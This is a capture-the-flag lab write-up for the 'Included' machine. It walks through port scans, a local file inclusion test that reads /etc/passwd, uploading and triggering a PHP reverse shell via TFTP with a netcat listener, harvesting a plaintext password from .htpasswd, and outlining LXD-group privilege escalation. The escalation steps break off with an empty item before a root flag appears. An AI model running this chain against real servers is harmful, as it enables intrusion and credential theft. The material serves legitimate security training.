# Included

|     Local    |     Remote     |
| ------------ | -------------- |
| 10.10.15.155 | 10.129.95.185  |

----

## Nmap

```
# nmap -Pn 10.129.95.185
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 18:51 EDT
Nmap scan report for 10.129.95.185
Host is up (0.044s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.86 seconds
```

```
# nmap -Pn -p 1-10000 10.129.95.185
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 18:52 EDT
Nmap scan report for 10.129.95.185
Host is up (0.045s latency).
Not shown: 9999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 4.51 seconds
```

## Scan UDP Ports (slow...)

```
# nmap -Pn -sU 10.129.95.185
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 18:54 EDT
Nmap scan report for 10.129.95.185
Host is up (0.28s latency).
Not shown: 980 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
772/udp   open|filtered cycleserv2
773/udp   open|filtered notify
789/udp   open|filtered unknown
1059/udp  open|filtered nimreg
1072/udp  open|filtered cardax
1214/udp  open|filtered fasttrack
3457/udp  open|filtered vat-control
17077/udp open|filtered unknown
17468/udp open|filtered unknown
19322/udp open|filtered unknown
20019/udp open|filtered unknown
20717/udp open|filtered unknown
21111/udp open|filtered unknown
28122/udp open|filtered unknown
44923/udp open|filtered unknown
49170/udp open|filtered unknown
49182/udp open|filtered unknown
62677/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1314.76 seconds

```

## Port 69: tftp (UDP)
> Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. 

Need some version information: (see man page)
```
# tftp -V 10.129.95.185         
tftp-hpa 5.3, without readline
```

## Port 80

```
# nmap -Pn -sV -sC -p 80 10.129.95.185
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 19:01 EDT
Nmap scan report for 10.129.95.185
Host is up (1.00s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://10.129.95.185/?file=home.php

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.66 seconds
```

Ran a `searchsploit Apache 2.4.29`: one priv esc that might be useful

Loaded the page in a browser (not much there). 

**Walk-Through:** ...if we take a look at the URL we can see that this has automatically changed to `http://{target_IP}/?file=home.php`. This is a common way that developers use to dynamically load pages in a website and if not programmed correctly it can often lead to the webpage being vulnerable to Local File Inclusion...

**[Local File Inclusion](../../local_file_inclusion.md)**: The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a “dynamic file inclusion” mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:
- Code execution on the web server
- Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS)
- Denial of Service (DoS)
- Sensitive Information Disclosure

LFI is the process of including files, ***that are already locally present on the server***, through the exploiting of vulnerable inclusion procedures implemented in the application.

Easy test for LFI: `http://10.129.95.185/?file=../../../../../etc/passwd` and see if you get the file contents. If you do, it's vulnerable.

Check out the /etc/passwd file on the target: 
```
# curl 'http://10.129.95.185/?file=/etc/passwd'
root:x:0:0:root:/root:/bin/bash
[snip for space]
mike:x:1000:1000:mike:/home/mike:/bin/bash
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```
- Note the last "user" (tftp) and the default working directory `/var/lib/tftpboot/`. 

### Upload a test file via tftp 
```
echo 'this is a test' > test.txt
tftp -4 -v 10.129.95.185 -c put test.txt
```

Load that with the LFI vulnerability in the URL: `http://10.129.95.185/?file=/var/lib/tftpboot/test.txt`
- If your text loads in the browser window, you're good.
- Continued below DirBusting...

## DirBusting 

Unnecessary. Since you can traverse the directory structure via LFI, just use the default directories in /etc/passwd as above.

```
# dirb http://10.129.95.185

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Aug 20 19:12:13 2024
URL_BASE: http://10.129.95.185/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.95.185/ ----
==> DIRECTORY: http://10.129.95.185/fonts/                                                                                                                 
==> DIRECTORY: http://10.129.95.185/images/                                                                                                                
+ http://10.129.95.185/index.php (CODE:301|SIZE:308)                                                                                                       
+ http://10.129.95.185/server-status (CODE:403|SIZE:278)                                                                                                   
                                                                                                                                                           
---- Entering directory: http://10.129.95.185/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                           
---- Entering directory: http://10.129.95.185/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Aug 20 19:16:04 2024
DOWNLOADED: 4612 - FOUND: 2
```

## Uplaod a Reverse Shell Payload

Use: [PentestMonkey Reverse PHP Shell](https://github.com/pentestmonkey/php-reverse-shell)
- Download it. Open in it VIM and change two variables (indicated with the comment `// CHANGE THIS`).
- The first variable `$ip` is the IP address of your attack machine (to receive the reverse shell).
- The second variable `$port` is the port on the attach machine you want to use to receive the reverse shell.

Upload that modified .php file to the target: 
```
# tftp -4 -v 10.129.95.185 -c put shell.php 
Connected to 10.129.95.185 (10.129.95.185), port 69
putting shell.php to 10.129.95.185:shell.php [netascii]
Sent 5689 bytes in 5.5 seconds [8225 bit/s]
```

Set up a listener on your attack machine: 
```
# nc -nlvp 1234
listening on [any] 1234 ...
```

Execute the reverse shell via the browswer URL: `http://10.129.95.185/?file=/var/lib/tftpboot/shell.php`
- Could run it with curl: `curl 'http://10.129.95.185/?file=/var/lib/tftpboot/shell.php'`
- Attack machine receives the reverse shell.
- User: www-data 
- Upgrade the shell: `/bin/bash -i` or `python3 -c 'import pty;pty.spawn("/bin/bash")'`

## Lateral Movement

The current user (www-data) has no perms to get anywhere. 
- Look around for ways to become user 'mike' (see the /etc/passwd results above; mike is the only other user besides root).
- Good place to look for login credentials: `/var/log/html/'
```
www-data@included:/var/www/html$ ls -la
ls -la
total 88
drwxr-xr-x 4 root     root      4096 Oct 13  2021 .
drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
-rw-r--r-- 1 www-data www-data  3704 Oct 13  2021 home.php
drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
-rw-r--r-- 1 www-data www-data   145 Oct 13  2021 index.php
-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt
```

Low-hanging Fruit: 
```
www-data@included:/var/www/html$ cat .htpasswd
cat .htpasswd
mike:Sheffield19
```

Become mike: 
```
www-data@included:/var/www/html$ su -h
su -h
Usage: su [options] [LOGIN]

Options:
  -c, --command COMMAND         pass COMMAND to the invoked shell
  -h, --help                    display this help message and exit
  -, -l, --login                make the shell a login shell
  -m, -p,
  --preserve-environment        do not reset environment variables, and
                                keep the same shell
  -s, --shell SHELL             use SHELL instead of the default in passwd

www-data@included:/var/www/html$ su -l mike
su -l mike
Password: Sheffield19

mike@included:~$ 
```

User Flag: 
```
mike@included:~$ cd /home/mike
cd /home/mike
mike@included:~$ ls
ls
user.txt
mike@included:~$ cat user.txt
cat user.txt
a56ef91d70cfbf2cdb8f454c006935a1
```

Groups User mike is in: 
```
mike@included:/etc$ groups mike
groups mike
mike : mike lxd
```

Google Search: "LXD (pronounced lex-dee) is the lightervisor, or lightweight container hypervisor. LXC (lex-see) is a program which creates and administers “containers” on a local system. It also provides an API to allow higher level managers, such as LXD, to administer containers."

[Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/): an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD.
- Additional Page with How-To: [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
- A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password
- LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket.
- One method of exploitation: Use the LXD API to mount the host’s root filesystem into a container.

**Linux Container (LXC):** often considered as a lightweight virtualization technology that is something in the middle between a chroot and a completely developed virtual machine, which creates an environment as close as possible to a Linux installation but without the need for a separate kernel.
- chroot: Chroot, short for "change root," is a Unix command that alters the apparent root directory for a specific process and its children. It creates a confined environment, isolating processes from the rest of the system. This isolation can be handy for various purposes, such as testing and debugging or enhancing security.

**Linux daemon (LXD):** The lightervisor, or lightweight container hypervisor. LXD is building on top of the container technology called LXC.

This exploit works by making use of the Alpine image, which is a lightweight Linux distribution based on busy box.

Walk-Through Steps: 
1. Install golang-go debootstrap rsync gpg squashfs-tools with apt.
2. Clone git repo: `git clone https://github.com/lxc/distrobuilder` (cd into that subdir and `make`)
3. 


```
cd /mnt/root/root
/mnt/root/root # ^[[74;18Rls 
ls 
root.txt
/mnt/root/root # ^[[74;18Rcat root.txt
cat root.txt
c693d9c7499d9f572ee375d4c14c7bcf
```

![image](https://github.com/user-attachments/assets/8809242b-0f58-4da2-9860-22b7b3cbfb46)


